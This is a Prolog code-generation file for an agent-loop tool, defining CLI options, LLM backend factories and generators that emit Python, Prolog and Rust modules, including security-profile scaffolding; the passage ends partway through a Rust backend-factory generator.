cli_argument(max_tokens, [long('--max-tokens'), type(int), default(none), help('Max tokens in context (default: 100000, uses estimation)')]).
cli_argument(auto_tools, [long('--auto-tools'), action(store_true), help('Auto-execute tools without confirmation')]).
cli_argument(no_tools, [long('--no-tools'), action(store_true), help('Disable tool execution')]).
cli_argument(sandbox, [long('--sandbox'), action(store_true), help('Run in sandbox mode (gemini: requires docker/podman)')]).
cli_argument(approval_mode, [long('--approval-mode'), default(yolo), choices([default, auto_edit, yolo, plan]), help('Tool approval mode (default: yolo). default=prompt, auto_edit=auto-approve edits, yolo=auto-approve all, plan=read-only')]).
cli_argument(allowed_tools, [long('--allowed-tools'), default([]), nargs('*'), help('Specific tools allowed without confirmation')]).
cli_argument(system_prompt, [long('--system-prompt'), default(none), help('System prompt to use')]).
cli_argument(no_fallback, [long('--no-fallback'), action(store_true), help('Skip coro.json fallback for commands and config (uwsal.json still checked)')]).
cli_argument(max_iterations, [long('--max-iterations'), short('-i'), type(int), default(none), help('Max tool iterations before pausing (0 = unlimited)')]).

%% Security
cli_argument(security_profile, [long('--security-profile'), default(none), choices([open, cautious, guarded, paranoid]), help('Security profile (default: cautious). open=no checks, cautious=path+command validation, guarded=proxy+audit+extra blocks, paranoid=allowlist-only')]).
cli_argument(no_security, [long('--no-security'), action(store_true), help('Disable all security checks (alias for --security-profile open)')]).
cli_argument(path_proxy, [long('--path-proxy'), action(store_true), help('Enable PATH-based command proxying (wrapper scripts in ~/.agent-loop/bin/)')]).
cli_argument(proot, [long('--proot'), action(store_true), help('Enable proot filesystem sandboxing (requires: pkg install proot)')]).
cli_argument(proot_allow_dir, [long('--proot-allow-dir'), default([]), action(append), help('Additional directory to bind into proot sandbox (repeatable)')]).

%% Session management
cli_argument(session, [long('--session'), short('-s'), default(none), help('Load a saved session by ID')]).
cli_argument(list_sessions, [long('--list-sessions'), action(store_true), help('List saved sessions')]).
cli_argument(sessions_dir, [long('--sessions-dir'), default(none), help('Directory for session files (default: ~/.agent-loop/sessions)')]).

%% Context format
cli_argument(context_format, [long('--context-format'), default(none), choices([plain, markdown, json, xml]), help('Format for context when sent to backend')]).

%% Streaming and cost tracking
cli_argument(stream_arg, [long('--stream'), action(store_true), help('Enable streaming output for API backends')]).
cli_argument(no_cost_tracking, [long('--no-cost-tracking'), action(store_true), help('Disable cost tracking')]).

%% Search
cli_argument(search_arg, [long('--search'), metavar('QUERY'), help('Search across saved sessions and exit')]).

%% Display mode
cli_argument(fancy, [long('--fancy'), action(store_true), help('Enable ncurses display mode with spinner (uses tput)')]).

%% Interactive with initial prompt
cli_argument(prompt_interactive, [short_first(true), short('-I'), long('--prompt-interactive'), metavar('PROMPT'), help('Start interactive mode with an initial prompt')]).

%% Prompt (positional)
cli_argument(prompt, [positional(true), long('prompt'), nargs('?'), help('Single prompt to run (non-interactive mode)')]).

%% cli_argument_group(GroupComment, ArgumentNames)
cli_argument_group('Agent selection (from config)', [agent, config, list_agents, init_config]).
cli_argument_group('Direct backend selection (overrides config)', [backend, command, model, host, port, api_key]).
cli_argument_group('Options', [no_tokens, context_mode, max_chars, max_words, max_tokens, auto_tools, no_tools, sandbox, approval_mode, allowed_tools, system_prompt, no_fallback, max_iterations]).
cli_argument_group('Security', [security_profile, no_security, path_proxy, proot, proot_allow_dir]).
cli_argument_group('Session management', [session, list_sessions, sessions_dir]).
cli_argument_group('Context format', [context_format]).
cli_argument_group('Streaming and cost tracking', [stream_arg, no_cost_tracking]).
cli_argument_group('Search', [search_arg]).
cli_argument_group('Display mode', [fancy]).
cli_argument_group('Interactive with initial prompt', [prompt_interactive]).
cli_argument_group('Prompt', [prompt]).

%% =============================================================================
%% CLI Override Behaviors
%% =============================================================================

%% cli_override(+ArgName, +ConfigField, +Behavior)
%% Maps CLI arguments to agent_config field overrides in main().
%% Behavior types:
%%   simple          — if args.X: agent_config.F = args.X
%%   set_true        — if args.X: agent_config.F = True
%%   clear_list      — if args.X: agent_config.F = []
%%   not_none_check  — if args.X is not None: agent_config.F = args.X
%%   backend_special — backend + clear command if no args.command
cli_override(backend, backend, backend_special).
cli_override(command, command, simple).
cli_override(model, model, simple).
cli_override(host, host, simple).
cli_override(port, port, simple).
cli_override(api_key, api_key, simple).
cli_override(context_mode, context_mode, simple).
cli_override(auto_tools, auto_tools, set_true).
cli_override(no_tools, tools, clear_list).
cli_override(system_prompt, system_prompt, simple).
cli_override(max_iterations, max_iterations, not_none_check).
cli_override(max_tokens, max_context_tokens, not_none_check).

%% =============================================================================
%% CLI Fallback Chains
%% =============================================================================

%% cli_fallbacks(BackendType, FallbackList)
%% Fallback chains for CLI backends — currently all empty
cli_fallbacks(coro, []).
cli_fallbacks('claude-code', []).
cli_fallbacks(gemini, []).
cli_fallbacks('ollama-cli', []).

%% -----------------------------------------------------------------------------
%% Backend Factory Dispatch Data
%% -----------------------------------------------------------------------------
%% backend_factory(BackendType, Properties)
%%   resolve_type: cli | api | api_local | openrouter
%%   class_name: Python class to instantiate
%%   import_from: module to import from (absent for coro — already imported)
%%   default_command: default CLI command name (cli backends)
%%   default_model: default model string
%%   constructor_args: list of tagged arg specs for the return statement

backend_factory(coro, [
    resolve_type(cli),
    class_name('CoroBackend'),
    default_command(coro),
    constructor_args([
        arg(command, cmd),
        arg(no_fallback, no_fallback),
        arg_expr(max_context_tokens, 'agent_config.max_context_tokens\n            if agent_config.max_context_tokens != 100000 else 0')
    ])
]).

backend_factory('claude-code', [
    resolve_type(cli),
    class_name('ClaudeCodeBackend'),
    import_from(backends),
    default_command(claude),
    default_model(sonnet),
    cli_args(["--print", "--model"]),
    constructor_args([
        arg(command, cmd),
        arg_model
    ])
]).

backend_factory(gemini, [
    resolve_type(cli),
    class_name('GeminiBackend'),
    import_from(backends),
    default_command(gemini),
    default_model('gemini-3-flash-preview'),
    cli_args(["--model"]),
    constructor_args([
        arg(command, cmd),
        arg_model,
        arg(sandbox, sandbox),
        arg(approval_mode, approval_mode),
        arg_expr(allowed_tools, 'allowed_tools or []')
    ])
]).

backend_factory(claude, [
    resolve_type(api),
    class_name('ClaudeAPIBackend'),
    import_from(backends),
    default_model('claude-sonnet-4-20250514'),
    constructor_args([
        arg(api_key, api_key),
        arg_model,
        arg(system_prompt, system_prompt)
    ])
]).

backend_factory(openai, [
    resolve_type(api),
    class_name('OpenAIBackend'),
    import_from(backends),
    default_model('gpt-4o'),
    constructor_args([
        arg(api_key, api_key),
        arg_model,
        arg(system_prompt, system_prompt),
        arg_expr(base_url, 'agent_config.extra.get(\'base_url\')')
    ])
]).

backend_factory(openrouter, [
    resolve_type(openrouter),
    class_name('OpenRouterBackend'),
    import_from(backends),
    constructor_args([
        arg(api_key, api_key),
        arg_expr(model, 'agent_config.model or cascade.get(\'model\')'),
        arg_expr(base_url, '(agent_config.extra.get(\'base_url\')\n                      or cascade.get(\'base_url\', \'https://openrouter.ai/api/v1\'))'),
        arg(system_prompt, system_prompt),
        arg_trailing(tools, tool_schemas)
    ])
]).

backend_factory('ollama-api', [
    resolve_type(api_local),
    class_name('OllamaAPIBackend'),
    import_from(backends),
    default_model(llama3),
    constructor_args([
        arg_expr(host, 'agent_config.host or \'localhost\''),
        arg_expr(port, 'agent_config.port or 11434'),
        arg_model,
        arg(system_prompt, system_prompt),
        arg(timeout, 'agent_config.timeout')
    ])
]).

backend_factory('ollama-cli', [
    resolve_type(cli),
    class_name('OllamaCLIBackend'),
    import_from(backends),
    default_command(ollama),
    default_model(llama3),
    constructor_args([
        arg(command, cmd),
        arg_model,
        arg(timeout, 'agent_config.timeout')
    ])
]).

%% Backend factory dispatch order (matches prototype if/elif chain)
backend_factory_order([coro, 'claude-code', gemini, claude, openai, openrouter, 'ollama-api', 'ollama-cli']).

%% streaming_capable(+ResolveType) — backend resolve types that support Prolog streaming
streaming_capable(api_local).
streaming_capable(api).
streaming_capable(openrouter).

%% backend_error_handler(+BackendName, +HandlerSpec)
%% Routes each Python backend to its error handler fragment.
%% HandlerSpec: cli | urllib | sdk(SdkName)
backend_error_handler('ollama-cli', cli).
backend_error_handler('ollama-api', urllib).
backend_error_handler(gemini, cli).
backend_error_handler('claude-code', cli).
backend_error_handler(claude, sdk(anthropic)).
backend_error_handler(openai, sdk(openai)).
backend_error_handler(coro, cli).
backend_error_handler(openrouter, urllib).

%% emit_backend_error_handler(+Stream, +BackendName)
%% Writes the appropriate error handler py_fragment for a backend.
emit_backend_error_handler(S, BackendName) :-
    backend_error_handler(BackendName, Spec),
    (Spec = cli ->
        write_py(S, error_handler_cli)
    ; Spec = urllib ->
        write_py(S, error_handler_urllib)
    ; Spec = sdk(SdkName) ->
        write_py(S, error_handler_api_sdk, [sdk=SdkName])
    ).

%% =============================================================================
%% Code Generation — Target Directories & Path Helpers
%% =============================================================================

target_dir(python, 'generated/python/').
target_dir(prolog, 'generated/prolog/').
target_dir(rust, 'generated/rust/src/').

%% output_path(+Language, +RelPath, -FullPath)
output_path(Lang, RelPath, FullPath) :-
    target_dir(Lang, Root),
    atom_concat(Root, RelPath, FullPath).

%% =============================================================================
%% Code Generation — Master Entry
%% =============================================================================

generate_all :-
    generate_all(python),
    generate_all(prolog),
    generate_all(rust).

generate_all(python) :-
    write('Generating Python target...'), nl,
    agent_loop_components:register_agent_loop_components,
    output_path(python, 'backends', BackendsDir),
    output_path(python, 'security', SecurityDir),
    make_directory_path(BackendsDir),
    make_directory_path(SecurityDir),
    generate_module(backends_init),
    generate_module(backends_base),
    findall(BN, agent_backend(BN, _), BackendNames),
    maplist(generate_backend, BackendNames),
    generate_module(security_init),
    generate_module(security_profiles),
    generate_module(costs),
    generate_module(tools_generated),
    generate_module(context),
    generate_module(config),
    generate_module(display),
    generate_module(tools),
    generate_module(aliases),
    generate_module(export),
    generate_module(history),
    generate_module(multiline),
    generate_module(retry),
    generate_module(search),
    generate_module(sessions),
    generate_module(skills),
    generate_module(templates),
    generate_module(security_audit),
    generate_module(security_proxy),
    generate_module(security_path_proxy),
    generate_module(security_proot_sandbox),
    generate_module(agent_loop_main),
    generate_module(readme),
    agent_loop_components:emit_test_metadata,
    write('Python target done.'), nl.

generate_all(prolog) :-
    write('Generating Prolog target...'), nl,
    output_path(prolog, '', PlRoot),
    make_directory_path(PlRoot),
    generate_prolog_modules,
    write('Prolog target done.'), nl.

generate_all(rust) :-
    write('Generating Rust target...'), nl,
    agent_loop_components:register_agent_loop_components,
    output_path(rust, '', RustSrc),
    make_directory_path(RustSrc),
    %% Phase 1 — data layer
    generate_rust_cargo_toml,
    generate_rust_lib,
    generate_rust_config,
    generate_rust_costs,
    generate_rust_tools,
    generate_rust_commands,
    generate_rust_security,
    %% Phase 2 — imperative layer
    generate_rust_types,
    generate_rust_context,
    generate_rust_backends,
    generate_rust_tool_handler,
    %% Phase 3 — CLI + sessions
    generate_rust_sessions,
    %% Phase 4 — config loading + streaming
    generate_rust_config_loader,
    generate_rust_main,
    write('Rust target done.'), nl.

%% =============================================================================
%% Prolog Target — Generate a functional SWI-Prolog agent loop
%% =============================================================================

generate_prolog_modules :-
    agent_loop_components:register_agent_loop_components,
    generate_prolog_costs,
    generate_prolog_config,
    generate_prolog_tools,
    generate_prolog_commands,
    generate_prolog_security,
    generate_prolog_backends,
    generate_prolog_agent_loop,
    generate_prolog_main.

%% --- Prolog output helpers ---

write_prolog_header(S, Module, Description) :-
    format(S, '%% ~w — ~w~n', [Module, Description]),
    format(S, '%% Auto-generated by agent_loop_module.pl~n', []),
    format(S, '%% DO NOT EDIT — regenerate with:~n', []),
    format(S, '%%   swipl -g "generate_all(prolog), halt" agent_loop_module.pl~n~n', []).

%% Write a properly quoted Prolog term
write_prolog_term(S, Term) :-
    (  is_list(Term)   -> write_prolog_list(S, Term)
    ;  string(Term)    -> format(S, '~q', [Term])
    ;  atom(Term)      -> format(S, '~q', [Term])
    ;  number(Term)    -> write(S, Term)
    ;  compound(Term)  -> write_canonical(S, Term)
    ;  write(S, Term)
    ).

write_prolog_list(S, []) :- write(S, '[]').
write_prolog_list(S, List) :-
    write(S, '['),
    write_prolog_list_items(S, List),
    write(S, ']').

write_prolog_list_items(_, []).
write_prolog_list_items(S, [X]) :- write_prolog_term(S, X).
write_prolog_list_items(S, [X|Xs]) :-
    Xs \= [],
    write_prolog_term(S, X),
    write(S, ', '),
    write_prolog_list_items(S, Xs).

%% =============================================================================
%% Prolog Target: costs.pl
%% =============================================================================

generate_prolog_costs :-
    output_path(prolog, 'costs.pl', Path),
    open(Path, write, S),
    write_prolog_header(S, costs, 'Token cost tracking'),
    agent_loop_components:emit_prolog_module_skeleton(S, costs, [
        exports([model_pricing/3, cost_tracker_init/1, cost_tracker_add/4,
                 cost_tracker_total/2, cost_tracker_format/2]),
        det([cost_tracker_init/1, cost_tracker_add/4,
             cost_tracker_total/2, cost_tracker_format/2]),
        dependencies([module(costs)])
    ]),
    agent_loop_components:emit_cost_facts(S, [target(prolog)]),
    write_prolog(S, cost_tracker_impl),
    close(S),
    format('  Generated prolog/costs.pl~n', []).

%% =============================================================================
%% Prolog Target: config.pl
%% =============================================================================

generate_prolog_config :-
    output_path(prolog, 'config.pl', Path),
    open(Path, write, S),
    write_prolog_header(S, config, 'CLI argument parsing and configuration'),
    agent_loop_components:emit_prolog_module_skeleton(S, config, [
        exports([cli_argument/2, agent_config_field/4, default_agent_preset/3,
                 api_key_env_var/2, api_key_file/2, parse_cli_args/2,
                 example_agent_config/3, config_search_path/2,
                 config_field_json_default/2, config_dir_file_name/1,
                 audit_profile_level/2, load_config/2, resolve_api_key/3]),
        use_modules([library(optparse), library(json)]),
        det([parse_cli_args/2, load_config/2, resolve_api_key/3]),
        dependencies([module(config)])
    ]),
    agent_loop_components:emit_prolog_config_facts(S, [target(prolog)]),
    write_prolog(S, config_parse_cli),
    write_prolog(S, config_load_config),
    write_prolog(S, config_resolve_api_key),
    close(S),
    format('  Generated prolog/config.pl~n', []).

%% =============================================================================
%% Prolog Target: tools.pl
%% =============================================================================

generate_prolog_tools :-
    output_path(prolog, 'tools.pl', Path),
    open(Path, write, S),
    write_prolog_header(S, tools, 'Tool execution'),
    agent_loop_components:emit_prolog_module_skeleton(S, tools, [
        exports([tool_spec/2, tool_handler/2, destructive_tool/1,
                 tool_description/5, execute_tool/3, describe_tool_call/4,
                 confirm_destructive/2, build_tool_input_schema/2]),
        use_modules([library(process), library(readutil), library(time), security]),
        dependencies([module(tools)]),
        table([build_tool_input_schema/2],
              'Tabling: memoize tool schema construction across REPL iterations'),
        det([execute_tool/3, describe_tool_call/4,
             confirm_destructive/2, build_tool_input_schema/2]),
        comment('JIT multi-arg indexing: tool_description/5 benefits from (arg1, arg2) indexing')
    ]),
    agent_loop_components:emit_tool_facts(S, [target(prolog)]),
    write_prolog(S, tools_execute_dispatch),
    write_prolog(S, tools_schema),
    write_prolog(S, tools_describe),
    write_prolog(S, tools_confirm),
    close(S),
    format('  Generated prolog/tools.pl~n', []).

%% =============================================================================
%% Prolog Target: commands.pl
%% =============================================================================

generate_prolog_commands :-
    output_path(prolog, 'commands.pl', Path),
    open(Path, write, S),
    write_prolog_header(S, commands, 'Slash commands and aliases'),
    agent_loop_components:emit_prolog_module_skeleton(S, commands, [
        exports([slash_command/4, command_alias/2, slash_command_group/2,
                 resolve_command/3, handle_slash_command/3]),
        dependencies([module(commands)]),
        det([resolve_command/3, handle_slash_command/3])
    ]),
    agent_loop_components:emit_command_facts(S, [target(prolog)]),
    write_prolog(S, commands_resolve),
    write_prolog(S, commands_handle_slash),
    close(S),
    format('  Generated prolog/commands.pl~n', []).

%% =============================================================================
%% Prolog Target: security.pl
%% =============================================================================

generate_prolog_security :-
    output_path(prolog, 'security.pl', Path),
    open(Path, write, S),
    write_prolog_header(S, security, 'Security profiles and path/command validation'),
    agent_loop_components:emit_prolog_module_skeleton(S, security, [
        exports([security_profile/2, blocked_path/1, blocked_path_prefix/1,
                 blocked_home_pattern/1, blocked_command_pattern/2,
                 is_path_blocked/1, is_command_blocked/2,
                 check_path_allowed/2, check_command_allowed/2,
                 set_security_profile/1]),
        use_modules([library(pcre)]),
        dependencies([module(security)]),
        det([check_path_allowed/2, check_command_allowed/2, set_security_profile/1])
    ]),
    write(S, ':- dynamic current_security_profile/1.\n'),
    write(S, 'current_security_profile(cautious).\n\n'),
    %% Emit security facts via component registry
    agent_loop_components:emit_security_facts(S, [target(prolog)]),
    %% Generate check predicates (compiled from declarative rules)
    agent_loop_components:emit_security_check_predicates(S, [target(prolog)]),
    close(S),
    format('  Generated prolog/security.pl~n', []).

%% =============================================================================
%% Prolog Target: backends.pl
%% =============================================================================

generate_prolog_backends :-
    output_path(prolog, 'backends.pl', Path),
    open(Path, write, S),
    write_prolog_header(S, backends, 'Backend definitions and API dispatch'),
    agent_loop_components:emit_prolog_module_skeleton(S, backends, [
        exports([agent_backend/2, backend_factory/2, backend_factory_order/1,
                 cli_fallbacks/2, create_backend/3, retry_config/3, retry_call/2,
                 send_request/4, send_request_streaming/4, format_api_error/2,
                 streaming_capable/1]),
        use_modules_compact([library(http/http_open), library(http/http_header),
                             library(json), library(readutil), library(process),
                             library(random)]),
        discontiguous([send_request_streaming_raw/5]),
        det([create_backend/3, retry_call/2, format_api_error/2]),
        dependencies([module(backends)])
    ]),
    %% Emit backend facts via component registry
    agent_loop_components:emit_backend_facts(S, [target(prolog)]),
    %% Backend implementation via prolog_fragment
    write_prolog(S, backends_create_backend),
    write_prolog(S, backends_retry_config),
    write_prolog(S, backends_format_api_error),
    write_prolog(S, backends_retry_call),
    write_prolog(S, backends_send_request),
    write_prolog(S, backends_send_request_raw_api),
    write_prolog(S, backends_send_request_raw_cli),
    write_prolog(S, backends_extract_response),
    %% Streaming capability facts
    agent_loop_components:emit_streaming_capable_facts(S, [target(prolog)]),
    write_prolog(S, backends_streaming_dispatch),
    write_prolog(S, backends_streaming_ndjson),
    write_prolog(S, backends_streaming_openai),
    write_prolog(S, backends_streaming_anthropic),
    write_prolog(S, backends_tc_delta),
    write_prolog(S, backends_sse_parser),
    close(S),
    format('  Generated prolog/backends.pl~n', []).

%% =============================================================================
%% Prolog Target: agent_loop.pl
%% =============================================================================

generate_prolog_agent_loop :-
    output_path(prolog, 'agent_loop.pl', Path),
    open(Path, write, S),
    write_prolog_header(S, agent_loop, 'Main agent loop REPL'),
    agent_loop_components:emit_prolog_module_skeleton(S, agent_loop, [
        exports([agent_loop/1, agent_loop/0]),
        use_modules([config, tools, backends, commands, security, costs,
                     library(json), library(filesex)]),
        dynamic([conversation/1, conversation_undo/1, max_iterations/1,
                 current_backend/1, current_format/1, streaming/1,
                 context_max_tokens/1, context_max_messages/1])
    ]),
    %% Agent loop implementation via prolog_fragment
    write_prolog(S, agent_loop_init_state),
    write_prolog(S, agent_loop_entry),
    write_prolog(S, agent_loop_repl_core),
    write_prolog(S, agent_loop_process_input),
    write_prolog(S, agent_loop_response),
    write_prolog(S, agent_loop_actions),
    write_prolog(S, agent_loop_helpers),
    write_prolog(S, agent_loop_export_search),
    write_prolog(S, agent_loop_context),
    close(S),
    format('  Generated prolog/agent_loop.pl~n', []).

%% =============================================================================
%% Prolog Target: main.pl — Entry point
%% =============================================================================

generate_prolog_main :-
    output_path(prolog, 'main.pl', Path),
    open(Path, write, S),
    write(S, '#!/usr/bin/env swipl\n'),
    write(S, '%% uwsal — UnifyWeaver Scripted Agent Loop (Prolog target)\n'),
    write(S, '%% Auto-generated by agent_loop_module.pl\n'),
    write(S, '%% Usage: swipl main.pl [options] [prompt]\n\n'),
    write(S, ':- use_module(config).\n'),
    write(S, ':- use_module(tools).\n'),
    write(S, ':- use_module(backends).\n'),
    write(S, ':- use_module(commands).\n'),
    write(S, ':- use_module(security).\n'),
    write(S, ':- use_module(costs).\n'),
    write(S, ':- use_module(agent_loop).\n\n'),
    write(S, ':- det(main/1).\n\n'),
    write(S, ':- initialization(main, main).\n\n'),
    write(S, 'main(Argv) :-\n'),
    write(S, '    agent_loop(Argv).\n'),
    close(S),
    format('  Generated prolog/main.pl~n', []).

%% =============================================================================
%% Rust Target — Generate a Rust library with data layer
%% =============================================================================

%% write_rust_header(+Stream, +Module, +Description)
%% Write the standard auto-generated header for Rust files.
write_rust_header(S, Module, Description) :-
    format(S, '// ~w — ~w~n', [Module, Description]),
    format(S, '// Auto-generated by UnifyWeaver agent_loop_module.pl~n', []),
    format(S, '// Do not edit manually.~n~n', []).

generate_rust_cargo_toml :-
    target_dir(rust, SrcDir),
    atom_concat(SrcDir, '../Cargo.toml', Path),
    open(Path, write, S),
    write(S, '[package]\n'),
    write(S, 'name = "agent-loop"\n'),
    write(S, 'version = "0.2.0"\n'),
    write(S, 'edition = "2021"\n'),
    write(S, 'description = "UnifyWeaver Agent Loop — data + imperative layer"\n\n'),
    write(S, '[[bin]]\n'),
    write(S, 'name = "uwsal"\n'),
    write(S, 'path = "src/main.rs"\n\n'),
    write(S, '[dependencies]\n'),
    write(S, 'serde = { version = "1", features = ["derive"] }\n'),
    write(S, 'serde_json = "1"\n'),
    write(S, 'once_cell = "1"\n'),
    write(S, 'clap = { version = "4", features = ["derive"] }\n'),
    write(S, 'regex = "1"\n'),
    write(S, 'reqwest = { version = "0.12", features = ["json", "blocking"] }\n'),
    write(S, 'rustyline = "14"\n'),
    write(S, 'serde_yaml = "0.9"\n'),
    close(S),
    format('  Generated rust/Cargo.toml~n', []).

generate_rust_lib :-
    output_path(rust, 'lib.rs', Path),
    open(Path, write, S),
    write_rust_header(S, lib, 'Agent Loop library root'),
    write(S, 'pub mod config;\n'),
    write(S, 'pub mod costs;\n'),
    write(S, 'pub mod tools;\n'),
    write(S, 'pub mod commands;\n'),
    write(S, 'pub mod security;\n'),
    write(S, 'pub mod types;\n'),
    write(S, 'pub mod context;\n'),
    write(S, 'pub mod backends;\n'),
    write(S, 'pub mod tool_handler;\n'),
    write(S, 'pub mod sessions;\n'),
    write(S, 'pub mod config_loader;\n'),
    close(S),
    format('  Generated rust/src/lib.rs~n', []).

generate_rust_config :-
    output_path(rust, 'config.rs', Path),
    open(Path, write, S),
    write_rust_header(S, config, 'Configuration types and static data'),
    agent_loop_components:emit_module_skeleton(S, rust, config, [
        use_external([serde-['Serialize', 'Deserialize']]),
        comment('Configuration data layer — CLI arguments, config fields, API keys')
    ]),
    write_rust(S, config_types),
    agent_loop_components:emit_rust_config_data(S, [target(rust)]),
    close(S),
    format('  Generated rust/src/config.rs~n', []).

generate_rust_costs :-
    output_path(rust, 'costs.rs', Path),
    open(Path, write, S),
    write_rust_header(S, costs, 'Model pricing and cost tracking'),
    agent_loop_components:emit_module_skeleton(S, rust, costs, [
        use_external([serde-['Serialize', 'Deserialize']]),
        comment('Cost tracking data layer — model pricing table')
    ]),
    write_rust(S, costs_types),
    %% Emit pricing table via component registry
    agent_loop_components:emit_rust_cost_facts(S, [target(rust)]),
    write_rust(S, costs_tracker),
    close(S),
    format('  Generated rust/src/costs.rs~n', []).

generate_rust_tools :-
    output_path(rust, 'tools.rs', Path),
    open(Path, write, S),
    write_rust_header(S, tools, 'Tool specifications and handler registry'),
    agent_loop_components:emit_module_skeleton(S, rust, tools, [
        comment('Tool data layer — specs, handlers, destructive tool set')
    ]),
    write_rust(S, tools_types),
    agent_loop_components:emit_rust_tool_facts(S, [target(rust)]),
    close(S),
    format('  Generated rust/src/tools.rs~n', []).

generate_rust_commands :-
    output_path(rust, 'commands.rs', Path),
    open(Path, write, S),
    write_rust_header(S, commands, 'Slash command specifications'),
    agent_loop_components:emit_module_skeleton(S, rust, commands, [
        comment('Command data layer — slash command registry')
    ]),
    write_rust(S, commands_types),
    agent_loop_components:emit_rust_command_facts(S, [target(rust)]),
    close(S),
    format('  Generated rust/src/commands.rs~n', []).

generate_rust_security :-
    output_path(rust, 'security.rs', Path),
    open(Path, write, S),
    write_rust_header(S, security, 'Security profiles and audit configuration'),
    agent_loop_components:emit_module_skeleton(S, rust, security, [
        use_external([serde-['Serialize', 'Deserialize']]),
        comment('Security data layer — profiles, rules, audit levels')
    ]),
    write_rust(S, security_types),
    agent_loop_components:emit_rust_security_facts(S, [target(rust)]),
    emit_rust_regex_lists(S),
    close(S),
    format('  Generated rust/src/security.rs~n', []).

%% emit_rust_regex_lists(+Stream)
%% Emit regex_list/2 facts as Rust static &[&str] arrays into security.rs.
emit_rust_regex_lists(S) :-
    write(S, '\n'),
    forall(
        (regex_list_variable(ListName, _PV), regex_list(ListName, Patterns)),
        emit_rust_regex_list(S, ListName, Patterns)
    ).

%% emit_rust_regex_list(+Stream, +ListName, +Patterns)
emit_rust_regex_list(S, ListName, Patterns) :-
    upcase_atom(ListName, Upper),
    format(S, 'pub static ~w: &[&str] = &[~n', [Upper]),
    forall(
        member(Pat, Patterns),
        ( strip_python_raw_prefix(Pat, RustPat),
          format(S, '    r~w,~n', [RustPat]) )
    ),
    write(S, '];\n\n').

%% strip_python_raw_prefix(+PythonPattern, -RustPattern)
%% Converts Python r'^foo' to "^foo" for Rust regex.
strip_python_raw_prefix(Pat, RustPat) :-
    atom_string(Pat, PatS),
    ( sub_string(PatS, 0, 2, _, "r'") ->
        sub_string(PatS, 2, _, 1, Inner),
        format(atom(RustPat), '"~w"', [Inner])
    ; sub_string(PatS, 0, 2, _, "r\"") ->
        sub_string(PatS, 1, _, 0, RustPat)
    ;
        RustPat = Pat
    ).

%% =============================================================================
%% Rust Phase 2 — Imperative Layer Generators
%% =============================================================================

%% rust_type_mapping(+PythonType, -RustType)
%% Maps Python type annotations from agent_config_field/4 to Rust types.
rust_type_mapping('str', 'String').
rust_type_mapping('str | None', 'Option<String>').
rust_type_mapping('int', 'i64').
rust_type_mapping('int | None', 'Option<i64>').
rust_type_mapping('bool', 'bool').
rust_type_mapping('list[str]', 'Vec<String>').
rust_type_mapping('dict', 'std::collections::HashMap<String, serde_json::Value>').

generate_rust_types :-
    output_path(rust, 'types.rs', Path),
    open(Path, write, S),
    write_rust_header(S, types, 'Core runtime types'),
    agent_loop_components:emit_module_skeleton(S, rust, types, [
        use_external([serde-['Serialize', 'Deserialize']]),
        comment('Core types — ToolCall, AgentResponse, AgentConfig, ToolResult, Message')
    ]),
    write_rust(S, types_core),
    %% Data-driven AgentConfig struct from agent_config_field/4
    generate_rust_agent_config(S),
    close(S),
    format('  Generated rust/src/types.rs~n', []).

%% generate_rust_agent_config(+Stream)
%% Emit AgentConfig struct from agent_config_field/4 facts.
generate_rust_agent_config(S) :-
    write(S, '/// Agent configuration.\n'),
    write(S, '#[derive(Debug, Clone)]\n'),
    write(S, 'pub struct AgentConfig {\n'),
    findall(acf(N,T,D,C), agent_config_field(N,T,D,C), Fields),
    maplist([acf(N,T,_D,C)]>>(
        (rust_type_mapping(T, RustType) -> true ; RustType = 'String'),
        (C \= "" ->
            format(S, '    /// ~w~n', [C])
        ; true),
        format(S, '    pub ~w: ~w,~n', [N, RustType])
    ), Fields),
    write(S, '}\n\n'),
    %% Generate Default impl
    write(S, 'impl Default for AgentConfig {\n'),
    write(S, '    fn default() -> Self {\n'),
    write(S, '        Self {\n'),
    maplist([acf(N,T,D,_C)]>>(
        rust_default_value(T, D, RustDefault),
        format(S, '            ~w: ~w,~n', [N, RustDefault])
    ), Fields),
    write(S, '        }\n'),
    write(S, '    }\n'),
    write(S, '}\n\n').

%% rust_default_value(+PythonType, +PrologDefault, -RustDefault)
%% Convert Prolog default values to Rust default expressions.
rust_default_value(_, none, 'Default::default()') :- !.
rust_default_value(_, 'None', 'None') :- !.
rust_default_value('bool', 'True', 'true') :- !.
rust_default_value('bool', 'False', 'false') :- !.
rust_default_value('int', Val, Val) :- number(Val), !.
rust_default_value('int', ValAtom, ValStr) :-
    atom(ValAtom), atom_number(ValAtom, _), !,
    atom_string(ValAtom, ValStr).
rust_default_value('str', Val, Quoted) :-
    atom(Val), !,
    atom_string(Val, S),
    (sub_string(S, 0, 1, _, "\"") ->
        %% Already quoted like "continue" → strip quotes, re-wrap as Rust String
        sub_string(S, 1, _, 1, Inner),
        format(atom(Quoted), '"~w".to_string()', [Inner])
    ;
        format(atom(Quoted), '"~w".to_string()', [S])
    ).
rust_default_value('list[str]', _, 'Vec::new()') :- !.
rust_default_value('dict', _, 'std::collections::HashMap::new()') :- !.
rust_default_value(_, _, 'Default::default()').

generate_rust_context :-
    output_path(rust, 'context.rs', Path),
    open(Path, write, S),
    write_rust_header(S, context, 'Conversation context management'),
    agent_loop_components:emit_module_skeleton(S, rust, context, [
        comment('Context manager — message history, sliding window')
    ]),
    write(S, 'use crate::types::*;\n\n'),
    write_rust(S, context_manager),
    close(S),
    format('  Generated rust/src/context.rs~n', []).

generate_rust_backends :-
    output_path(rust, 'backends.rs', Path),
    open(Path, write, S),
    write_rust_header(S, backends, 'Backend trait and implementations'),
    write(S, 'use std::process::{Command, Stdio};\n'),
    write(S, 'use crate::types::*;\n\n'),
    write_rust(S, backend_trait),
    write_rust(S, backend_cli_impl),
    write_rust(S, streaming_handler),
    write_rust(S, backend_api_impl),
    %% Data-driven backend factory
    generate_rust_backend_factory(S),
    close(S),
    format('  Generated rust/src/backends.rs~n', []).

%% resolve_factory_backend(+FactoryName, -AgentProps)
%% Bridge backend_factory/2 → agent_backend/2 via class_name match.
resolve_factory_backend(FactoryName, AgentProps) :-
    backend_factory(FactoryName, FProps),
    member(class_name(ClassName), FProps),
    agent_backend(_, AgentProps),
    member(class_name(ClassName), AgentProps), !.

%% generate_rust_backend_factory(+Stream)
%% Emit create_backend function using backend_factory/2 names (hyphens)
%% via backend_factory_order/1 for consistent CLI naming.
generate_rust_backend_factory(S) :-
    backend_factory_order(Order),
    write(S, '/// Create a backend from configuration.\n'),
    write(S, 'pub fn create_backend(config: &AgentConfig) -> Box<dyn AgentBackend> {\n'),
